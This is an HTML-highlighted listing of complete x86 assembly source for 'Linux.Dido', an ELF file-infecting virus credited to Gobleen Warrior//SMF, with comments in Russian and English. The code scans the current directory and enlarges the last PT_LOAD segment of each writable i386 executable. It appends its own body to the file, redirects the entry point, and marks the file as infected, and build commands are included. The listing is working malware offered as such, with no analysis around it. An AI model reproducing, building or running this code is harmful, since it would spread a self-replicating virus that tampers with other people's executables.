<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>DIDO_10.S</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
#                              </span><span class="sc4">&lt;&lt;</span><span class="sc5">Linux.Dido</span><span class="sc4">&gt;&gt;</span><span class="sc0">
#
# Этот вирус внедряется в </span><span class="sc5">ELF</span><span class="sc0"> файл путем модификации заголовка последнего
# сегмента с атрибутом </span><span class="sc5">PT_LOAD</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">загружается в память</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> Раьотает в текущем
# каталоге</span><span class="sc5">.</span><span class="sc0"> Особо сильно я его не тестировал</span><span class="sc4">,</span><span class="sc0"> поэтому возможны глюки</span><span class="sc5">.</span><span class="sc0"> Метод
# заражения был описан в </span><span class="sc5">IKX</span><span class="sc0">#</span><span class="sc2">5.</span><span class="sc0">
#
# Компиляция</span><span class="sc4">:</span><span class="sc0">
# </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">o</span><span class="sc0"> </span><span class="sc5">dido_10.o</span><span class="sc0"> </span><span class="sc5">dido_10.s</span><span class="sc0">
# </span><span class="sc5">ld</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">s</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">o</span><span class="sc0"> </span><span class="sc5">dido_10</span><span class="sc0"> </span><span class="sc5">dido_10.o</span><span class="sc0">
#
# </span><span class="sc2">18.04.01</span><span class="sc0">                                           </span><span class="sc4">(</span><span class="sc10">C</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc5">Gobleen</span><span class="sc0"> </span><span class="sc5">Warrior</span><span class="sc4">//</span><span class="sc5">SMF</span><span class="sc0">

                        </span><span class="sc10">.text</span><span class="sc0">
                        </span><span class="sc5">.globl</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">

#############################################################################
#                       </span><span class="sc5">FIRST</span><span class="sc0"> </span><span class="sc5">GENERATION</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0"> </span><span class="sc5">FILE</span><span class="sc0">                          #
#############################################################################
</span><span class="sc5">pseudo_host</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$thank_u_Dido</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$thank_u_Dido_len</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">thank_u_Dido</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc5">.ascii</span><span class="sc0"> </span><span class="sc3">"\12\11\11\42...but your picture on my wall\12"</span><span class="sc0">
                        </span><span class="sc5">.ascii</span><span class="sc0"> </span><span class="sc3">"\11\11it reminds me that it's not so bad,\12"</span><span class="sc0">
                        </span><span class="sc5">.ascii</span><span class="sc0"> </span><span class="sc3">"\11\11it's not so bad...\42\12\12"</span><span class="sc0">
                        </span><span class="sc5">.asciz</span><span class="sc0"> </span><span class="sc3">"\11\11\11Thank you, Dido!\12\12"</span><span class="sc0">
</span><span class="sc5">thank_u_Dido_len</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">.</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">thank_u_Dido</span><span class="sc0">

#############################################################################
#                             </span><span class="sc5">MAIN</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc5">CODE</span><span class="sc0">                               #
#############################################################################
</span><span class="sc5">_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">pushal</span><span class="sc0">
                        </span><span class="sc6">pushf</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fucking_all</span><span class="sc0">
</span><span class="sc5">fucking_all</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">popl</span><span class="sc0"> </span><span class="sc5">%ebp</span><span class="sc0">
                        </span><span class="sc5">subl</span><span class="sc0"> </span><span class="sc5">$fucking_all</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebp</span><span class="sc0">

# </span><span class="sc5">Open</span><span class="sc0"> </span><span class="sc5">current</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">leal</span><span class="sc0"> </span><span class="sc5">current_dir</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc5">orl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">js</span><span class="sc0"> </span><span class="sc5">exit_virus</span><span class="sc0">                   # </span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">an</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">
                        </span><span class="sc5">xchgl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">

# </span><span class="sc5">Read</span><span class="sc0"> </span><span class="sc5">strings</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc0">
</span><span class="sc5">read_dir_string</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$89</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">leal</span><span class="sc0"> </span><span class="sc5">name_buffa</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc5">decl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_virus</span><span class="sc0">                  # </span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc13">'s no filez
</span><span class="sc0">
                        </span><span class="sc5">pushl</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">                      # </span><span class="sc5">Save</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">

# </span><span class="sc5">Check</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">needed</span><span class="sc0"> </span><span class="sc5">permissions</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$33</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">leal</span><span class="sc0"> </span><span class="sc5">name_buffa</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$4</span><span class="sc4">|</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc5">orl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_file</span><span class="sc0">

# </span><span class="sc5">Open</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc4">/</span><span class="sc5">write</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">leal</span><span class="sc0"> </span><span class="sc5">name_buffa</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc5">orl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">js</span><span class="sc0"> </span><span class="sc5">next_file</span><span class="sc0">
                        </span><span class="sc5">xchgl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">

# </span><span class="sc5">Read</span><span class="sc0"> </span><span class="sc5">ELF</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">buffa</span><span class="sc0">
                        </span><span class="sc5">leal</span><span class="sc0"> </span><span class="sc5">elf_header</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$elf_header_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__NR_read</span><span class="sc0">

                        </span><span class="sc5">orl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">js</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

# </span><span class="sc5">Do</span><span class="sc0"> </span><span class="sc5">some</span><span class="sc0"> </span><span class="sc5">stupid</span><span class="sc0"> </span><span class="sc5">checkz</span><span class="sc0">
                        </span><span class="sc5">cmpl</span><span class="sc0"> </span><span class="sc5">$0x464c457f</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">e_ident</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0"> # </span><span class="sc5">ELF</span><span class="sc0"> </span><span class="sc5">file?</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                        </span><span class="sc5">cmpl</span><span class="sc0"> </span><span class="sc5">$0x00030002</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">e_ident</span><span class="sc4">+</span><span class="sc2">0x10</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0"> # </span><span class="sc5">I386</span><span class="sc0"> </span><span class="sc5">exec?</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                        </span><span class="sc5">cmpl</span><span class="sc0"> </span><span class="sc5">$0x30446944</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">e_ident</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0"> # </span><span class="sc5">Infected?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

# </span><span class="sc5">Get</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc5">PT_LOAD</span><span class="sc0"> </span><span class="sc5">program</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">
# </span><span class="sc4">(</span><span class="sc5">as</span><span class="sc0"> </span><span class="sc5">i</span><span class="sc0"> </span><span class="sc5">saw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc5">goes</span><span class="sc0"> </span><span class="sc5">before</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">file.</span><span class="sc0">
# </span><span class="sc5">Last</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">PT_DYNAMIC</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc5">movswl</span><span class="sc0"> </span><span class="sc5">e_phnum</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%esi</span><span class="sc0">
</span><span class="sc5">another_seg</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">decl</span><span class="sc0"> </span><span class="sc5">%esi</span><span class="sc0">
                        </span><span class="sc6">js</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                   # </span><span class="sc9">if</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc5">count</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc5">pushl</span><span class="sc0"> </span><span class="sc5">%esi</span><span class="sc0">
                        </span><span class="sc5">popl</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">shll</span><span class="sc0"> </span><span class="sc5">$5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">                   # </span><span class="sc4">(%</span><span class="sc8">ecx</span><span class="sc4">)*</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc5">addl</span><span class="sc0"> </span><span class="sc5">e_phoff</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">        # </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">PHT</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">

                        </span><span class="sc5">pushl</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">                      # </span><span class="sc5">Save</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0">
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__NR_lseek</span><span class="sc0">

# </span><span class="sc5">Read</span><span class="sc0"> </span><span class="sc5">program</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">entry</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">our</span><span class="sc0"> </span><span class="sc5">buffa</span><span class="sc0">
                        </span><span class="sc5">leal</span><span class="sc0"> </span><span class="sc5">prg_header</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$prg_header_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__NR_read</span><span class="sc0">

# </span><span class="sc5">Check</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc9">type</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">must</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">PT_LOAD</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc5">cmpl</span><span class="sc0"> </span><span class="sc5">$1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_type</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">another_seg</span><span class="sc0">

# </span><span class="sc5">Increase</span><span class="sc0"> </span><span class="sc5">sizes</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0">
                        </span><span class="sc5">addl</span><span class="sc0"> </span><span class="sc5">$0x3000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_filesz</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc5">addl</span><span class="sc0"> </span><span class="sc5">$0x3000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_memsz</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0">

# </span><span class="sc5">Back</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">entry</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">
                        </span><span class="sc5">popl</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__NR_lseek</span><span class="sc0">

# </span><span class="sc5">Write</span><span class="sc0"> </span><span class="sc5">updated</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0">
                        </span><span class="sc5">leal</span><span class="sc0"> </span><span class="sc5">prg_header</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$prg_header_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__NR_write</span><span class="sc0">

# </span><span class="sc5">Move</span><span class="sc0"> </span><span class="sc5">pointer</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">EOF</span><span class="sc0">
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__NR_lseek</span><span class="sc0">                 # </span><span class="sc5">%eax</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">F_SIZE</span><span class="sc0">

# </span><span class="sc5">Calculate</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc5">entrypoint</span><span class="sc0">
                        </span><span class="sc5">pushl</span><span class="sc0"> </span><span class="sc5">old_entry_point</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0">     # </span><span class="sc5">Save</span><span class="sc0"> </span><span class="sc5">old</span><span class="sc0"> </span><span class="sc5">EP</span><span class="sc0">

                        </span><span class="sc5">pushl</span><span class="sc0"> </span><span class="sc5">e_entry</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc5">popl</span><span class="sc0"> </span><span class="sc5">old_entry_point</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0">

                        </span><span class="sc5">subl</span><span class="sc0"> </span><span class="sc5">p_offset</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">       # </span><span class="sc5">%eax</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">F_SIZE</span><span class="sc0">
                        </span><span class="sc5">addl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_vaddr</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0">

                        </span><span class="sc5">pushl</span><span class="sc0"> </span><span class="sc5">p_vaddr</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0">             # </span><span class="sc5">%eax</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc5">EP</span><span class="sc0">
                        </span><span class="sc5">popl</span><span class="sc0"> </span><span class="sc5">e_entry</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0">

# </span><span class="sc5">Write</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">EOF</span><span class="sc0">
                        </span><span class="sc5">leal</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$virus_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__NR_write</span><span class="sc0">

# </span><span class="sc5">Set</span><span class="sc0"> </span><span class="sc5">pointer</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">BOF</span><span class="sc0">
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__NR_lseek</span><span class="sc0">

# </span><span class="sc5">Set</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0"> </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc5">already</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$0x30446944</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">e_ident</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0">

# </span><span class="sc5">Write</span><span class="sc0"> </span><span class="sc5">updated</span><span class="sc0"> </span><span class="sc5">ELF</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0">
                        </span><span class="sc5">leal</span><span class="sc0"> </span><span class="sc5">elf_header</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$elf_header_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__NR_write</span><span class="sc0">

# </span><span class="sc5">Restore</span><span class="sc0"> </span><span class="sc5">old</span><span class="sc0"> </span><span class="sc5">entry</span><span class="sc0"> </span><span class="sc5">point</span><span class="sc0">
                        </span><span class="sc5">popl</span><span class="sc0"> </span><span class="sc5">old_entry_point</span><span class="sc4">(%</span><span class="sc8">ebp</span><span class="sc4">)</span><span class="sc0">

# </span><span class="sc5">Close</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

# </span><span class="sc5">Read</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc0">
</span><span class="sc5">next_file</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">popl</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">read_dir_string</span><span class="sc0">

# </span><span class="sc5">Return</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc0">
</span><span class="sc5">exit_virus</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">popf</span><span class="sc0">
                        </span><span class="sc5">popal</span><span class="sc0">

</span><span class="sc5">old_entry_point</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">.</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">$pseudo_host</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">
#############################################################################
#                               </span><span class="sc5">SUBPROCEDURES</span><span class="sc0">                               #
#############################################################################
</span><span class="sc5">__NR_read</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__NR_write</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__NR_lseek</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$19</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

###############################################################################
#                            </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc5">DATA</span><span class="sc0"> </span><span class="sc5">STRUCTURE</span><span class="sc0">                             #
###############################################################################
                        </span><span class="sc5">.ascii</span><span class="sc0"> </span><span class="sc3">"Linux.Dido by Gobleen Warrior//SMF"</span><span class="sc0">
</span><span class="sc5">current_dir</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">.asciz</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc0">
